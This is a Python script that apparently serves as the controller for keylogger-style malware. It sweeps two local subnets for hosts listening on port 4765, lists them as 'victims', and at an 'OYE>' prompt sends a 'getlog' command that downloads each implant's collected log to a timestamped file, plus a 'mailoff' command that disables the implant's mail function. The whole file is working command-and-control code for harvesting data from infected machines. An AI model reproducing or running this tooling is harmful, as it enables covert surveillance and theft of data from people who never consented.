import socket
import port_scan
import os
import time


def main():
    victims = scan_victims()
    print("Available victims:\n")
    i = 0
    for addr in victims:
        print("[" + str(i) + "] " + addr)
        i += 1
    print("\n-------------------------------------\n")
    print("Syntax: <address> <command> <additional arguments>\n")
    usr_input = input("OYE> ")
    if len(usr_input.split(' ')[0]) < 4:
        address = victims[int(usr_input.split(' ')[0])]
    else:
        address = usr_input.split(' ')[0].strip()
    if usr_input.split(' ')[1] == "getlog":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address, 4765))
        print('\n' + s.recv(1024).decode('utf-8'))
        s.send(usr_input.split(' ')[1].encode())
        f = open(os.path.dirname(__file__) + "/" + address +
                 "_" + time.strftime("%d_%m_%Y_%H_%M_%S") + '.txt', 'w')
        l = s.recv(1024)
        while l:
            f.write(l.decode('utf-8'))
            l = s.recv(1024)
        f.close()
        print("Done Receiving")
    elif usr_input.split(' ')[1] == "mailoff":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address.split(" ")[0], 4765))
        print(s.recv(1024).decode('utf-8'))
        s.send(usr_input.split(' ')[1].encode())
        print("\n[+] Turned mail off")


def scan_victims():
    victims = []
    try:
        for i in range(0, 2):
            for j in range(0, 70):
                address = '192.168.' + str(i) + '.' + str(j)
                print(address + ":\t" + str(port_scan.check_port(address, 4765)))
                if port_scan.check_port(address, 4765) == 0:
                    victims.append(address)
    except KeyboardInterrupt:
        return victims
    return victims

if __name__ == '__main__':
    main()
